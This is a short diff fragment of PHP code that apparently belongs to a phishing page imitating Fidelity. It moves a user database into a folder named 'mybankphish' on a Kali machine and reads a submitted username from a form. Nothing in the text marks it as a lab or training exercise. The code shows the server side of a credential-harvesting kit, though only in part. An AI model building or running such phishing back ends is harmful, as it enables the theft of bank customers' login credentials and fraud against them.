@@ -118,7 +118,7 @@
 
 
 <?php
-$db = new PDO("sqlite:/home/kali/wwwdata/fidelityusers.db");
+$db = new PDO("sqlite:/home/kali/mybankphish/fidelityusers.db");
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
   // collect value of input field
   $myUsername = $_POST['myUsername'];
